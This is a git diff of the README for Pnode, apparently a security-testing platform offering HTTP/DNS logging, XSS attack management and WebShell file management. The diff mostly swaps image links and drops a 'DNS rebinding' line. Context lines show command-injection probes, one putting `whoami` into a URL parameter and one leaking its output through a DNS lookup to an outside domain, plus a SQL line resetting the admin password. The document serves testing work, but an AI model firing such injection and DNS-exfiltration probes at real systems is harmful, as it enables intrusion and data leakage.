@@ -32,7 +32,6 @@ Pnode
 
 * HTTP log
 * DNS log
-* DNS rebinding
 * XSS攻击管理模块
 * WebShell等文件管理模块
 
@@ -42,7 +41,7 @@ curl http://127.0.0.1:10082/public/?c=`whoami`
 
 
 
-![](https://ws4.sinaimg.cn/large/006tNc79ly1fzbpadxielj31ik0m6ac2.jpg)
+![](http://p0desta-pictures.test.upcdn.net/20190614112000.png)
 
 
 
@@ -52,11 +51,11 @@ ping -c 2 `whoami`.pnode.tk
 
 
 
-![](https://ws1.sinaimg.cn/large/006tNc79ly1fzb0a7st2ej31fc0dmdi0.jpg)
+![](http://p0desta-pictures.test.upcdn.net/20190614112245.png)
 
-![](https://ws1.sinaimg.cn/large/006tNc79ly1fzbr5mp56uj31fb0u0afo.jpg)
+![](http://p0desta-pictures.test.upcdn.net/20190614112021.png)
 
-![](https://ws2.sinaimg.cn/large/006tNc79ly1fzbr6j7i0zj31r00su41a.jpg)
+![](http://p0desta-pictures.test.upcdn.net/20190614112034.png)
 
 
 
@@ -76,9 +75,9 @@ update users set password=md5('admin') where username='admin'
 
 如果需要DNS log功能,首先`https://my.freenom.com/`注册一个账号,然后免费申请一个域名
 
-![](https://ws3.sinaimg.cn/large/006tNc79ly1fzb0n0s9k9j320g0rygu7.jpg)
 
-![](https://ws4.sinaimg.cn/large/006tNc79ly1fzb0otdeumj31se0o2n0g.jpg)
+
+![](http://p0desta-pictures.test.upcdn.net/20190614112047.png)
 
 然后将你的vps的外网ip填入
 
